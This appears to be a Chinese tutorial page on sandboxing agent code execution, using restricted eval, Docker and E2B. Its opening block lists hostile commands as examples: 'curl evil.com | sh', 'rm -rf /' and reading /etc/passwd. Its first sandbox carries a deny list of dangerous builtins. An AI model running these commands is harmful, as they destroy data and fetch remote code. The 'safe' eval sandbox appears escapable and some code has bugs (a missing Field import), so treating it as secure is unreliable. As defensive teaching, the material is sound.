---
layout: default
title: "W7D3 · 代码执行沙箱"
---

# 代码执行沙箱：安全地让 Agent 运行代码

> **Week 7 · Day 3** | 难度：⭐⭐⭐⭐⭐

---

## 代码执行的风险

让 Agent 执行代码是最强大也最危险的能力：

```
危险代码示例（Agent 可能生成）：
import os
os.system("rm -rf /")           # 删除文件系统
os.system("curl evil.com | sh") # 下载执行恶意脚本
open("/etc/passwd").read()       # 读取敏感文件
__import__('subprocess').call(['ls', '/'])  # 系统命令
```

## 沙箱方案1：受限 eval（最简单）

```python
from langchain.tools import tool
import ast
import math
import statistics

# 安全白名单
SAFE_BUILTINS = {
    "abs": abs, "all": all, "any": any,
    "bool": bool, "dict": dict, "enumerate": enumerate,
    "filter": filter, "float": float, "format": format,
    "frozenset": frozenset, "hasattr": hasattr, "hash": hash,
    "int": int, "isinstance": isinstance, "issubclass": issubclass,
    "len": len, "list": list, "map": map, "max": max, "min": min,
    "next": next, "print": print, "range": range, "repr": repr,
    "reversed": reversed, "round": round, "set": set, "slice": slice,
    "sorted": sorted, "str": str, "sum": sum, "tuple": tuple,
    "type": type, "zip": zip,
}

SAFE_MODULES = {
    "math": math,
    "statistics": statistics,
}

@tool
def safe_python_eval(code: str) -> str:
    """在安全环境中执行 Python 代码（仅支持数学计算和基本操作）。
    
    限制：不能导入模块、不能访问文件系统、不能执行系统命令。
    适合：数学计算、数据处理、列表操作等。
    """
    try:
        # 先用 AST 检查语法安全性
        tree = ast.parse(code, mode='exec')
        
        # 检查危险节点
        for node in ast.walk(tree):
            if isinstance(node, (ast.Import, ast.ImportFrom)):
                return "错误：不允许导入模块"
            if isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name):
                    if node.func.id in ["eval", "exec", "compile", "open", "__import__"]:
                        return f"错误：不允许调用 {node.func.id}"
        
        # 执行代码
        local_vars = {}
        global_vars = {"__builtins__": SAFE_BUILTINS, **SAFE_MODULES}
        
        exec(compile(tree, "<string>", "exec"), global_vars, local_vars)
        
        # 返回最后一个变量或 print 输出
        return str(local_vars) if local_vars else "代码执行完成（无返回值）"
    
    except SyntaxError as e:
        return f"语法错误：{e}"
    except Exception as e:
        return f"执行错误：{type(e).__name__}: {e}"

# 测试
print(safe_python_eval.invoke({"code": "result = sum(range(1, 101))\nprint(result)"}))
print(safe_python_eval.invoke({"code": "import os"}))  # 应该被拒绝
```

## 沙箱方案2：Docker 容器（推荐生产使用）

```python
import docker
import tempfile
import os
from typing import Optional

class DockerCodeSandbox:
    """Docker 容器代码沙箱"""
    
    def __init__(self, 
                 image: str = "python:3.11-slim",
                 timeout: int = 30,
                 memory_limit: str = "256m",
                 cpu_quota: int = 50000):  # 50% CPU
        self.client = docker.from_env()
        self.image = image
        self.timeout = timeout
        self.memory_limit = memory_limit
        self.cpu_quota = cpu_quota
        
        # 预拉取镜像
        try:
            self.client.images.get(image)
        except docker.errors.ImageNotFound:
            print(f"拉取镜像 {image}...")
            self.client.images.pull(image)
    
    def execute(self, code: str, 
                stdin_input: str = None,
                additional_packages: list = None) -> dict:
        """在 Docker 容器中执行代码"""
        
        # 创建临时目录
        with tempfile.TemporaryDirectory() as tmpdir:
            # 写入代码文件
            code_file = os.path.join(tmpdir, "code.py")
            with open(code_file, "w") as f:
                # 如需安装包，先安装
                if additional_packages:
                    install_cmd = f"import subprocess; subprocess.run(['pip', 'install', {', '.join(repr(p) for p in additional_packages)}])\n"
                    f.write(install_cmd)
                f.write(code)
            
            try:
                # 运行容器
                result = self.client.containers.run(
                    self.image,
                    command=f"python /workspace/code.py",
                    volumes={tmpdir: {"bind": "/workspace", "mode": "ro"}},
                    
                    # 安全限制
                    mem_limit=self.memory_limit,
                    cpu_quota=self.cpu_quota,
                    network_mode="none",          # 禁止网络访问
                    read_only=True,               # 只读文件系统
                    user="nobody",                # 非 root 用户
                    cap_drop=["ALL"],             # 删除所有 Linux capabilities
                    security_opt=["no-new-privileges"],
                    
                    # 执行设置
                    stdin_open=bool(stdin_input),
                    detach=False,
                    remove=True,
                    timeout=self.timeout,
                    
                    # 临时目录
                    tmpfs={"/tmp": "size=64m,noexec"},
                )
                
                output = result.decode("utf-8") if isinstance(result, bytes) else result
                
                return {
                    "success": True,
                    "output": output[:5000],  # 截断过长输出
                    "truncated": len(output) > 5000
                }
            
            except docker.errors.ContainerError as e:
                return {
                    "success": False,
                    "output": "",
                    "error": e.stderr.decode("utf-8") if e.stderr else str(e),
                    "exit_code": e.exit_status
                }
            except Exception as e:
                return {
                    "success": False,
                    "output": "",
                    "error": str(e)
                }

# 将 Docker 沙箱包装为 LangChain 工具
from langchain.tools import StructuredTool
from pydantic import BaseModel

sandbox = DockerCodeSandbox()

class CodeExecuteInput(BaseModel):
    code: str = Field(description="要执行的 Python 代码")
    timeout: int = Field(default=30, description="超时时间（秒）")

def execute_code_safely(code: str, timeout: int = 30) -> str:
    """在 Docker 沙箱中安全执行 Python 代码"""
    sandbox.timeout = timeout
    result = sandbox.execute(code)
    
    if result["success"]:
        output = result["output"]
        if result.get("truncated"):
            output += "\n[输出已截断]"
        return f"执行成功：\n{output}" if output else "执行成功（无输出）"
    else:
        return f"执行失败：\n{result.get('error', '未知错误')}"

code_tool = StructuredTool.from_function(
    func=execute_code_safely,
    name="execute_python",
    description="""在安全的 Docker 沙箱中执行 Python 代码。
    支持：数据分析、数学计算、字符串处理、文件操作（仅限沙箱内）
    限制：无网络访问、无系统命令、最多运行30秒、最多使用256MB内存
    适合：数据处理、算法实现、数学计算、绘图等任务""",
    args_schema=CodeExecuteInput
)

# 测试
result = execute_code_safely("""
import math

def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)

for i in range(10):
    print(f"F({i}) = {fibonacci(i)}")
""")
print(result)
```

## 沙箱方案3：E2B（托管沙箱服务）

```python
# pip install e2b-code-interpreter
from e2b_code_interpreter import Sandbox

def execute_with_e2b(code: str) -> str:
    """使用 E2B 托管沙箱执行代码（无需自己维护 Docker）"""
    with Sandbox() as sandbox:
        execution = sandbox.run_code(code)
        
        if execution.error:
            return f"执行错误：{execution.error.name}: {execution.error.value}"
        
        results = []
        for result in execution.results:
            if result.text:
                results.append(result.text)
            elif result.png:
                # 图片结果（数据可视化）
                results.append("[图表已生成]")
        
        logs = execution.logs.stdout + execution.logs.stderr
        
        output = "\n".join(results + logs)
        return output[:3000] if output else "执行成功（无输出）"

# E2B 特别适合数据可视化
code = """
import matplotlib.pyplot as plt
import numpy as np

x = np.linspace(0, 2*np.pi, 100)
plt.plot(x, np.sin(x), label='sin(x)')
plt.plot(x, np.cos(x), label='cos(x)')
plt.legend()
plt.title('三角函数')
plt.savefig('plot.png')
print("图表已保存")
"""
# result = execute_with_e2b(code)
```

## 踩坑经验

### 坑1：Docker in Docker 权限问题

**问题**：在容器化部署的 Agent 中运行 Docker 沙箱，权限不足。  
**解法**：挂载 Docker socket（`/var/run/docker.sock`），或使用 Kubernetes Pod + gVisor。

### 坑2：代码执行超时后容器未清理

**问题**：超时的容器继续运行，占用资源。  
**解法**：使用 `docker.containers.run(remove=True)` 自动清理，或定期清理 zombie 容器。

### 坑3：pip 安装包在沙箱内网络被禁

**问题**：用了 `network_mode="none"` 后，pip 无法安装包。  
**解法**：预先构建包含所需包的定制镜像，或在启动容器时先允许网络安装包，再断网执行代码。

---

*W7D3 · 代码执行沙箱 | Agent + Claw 系列*
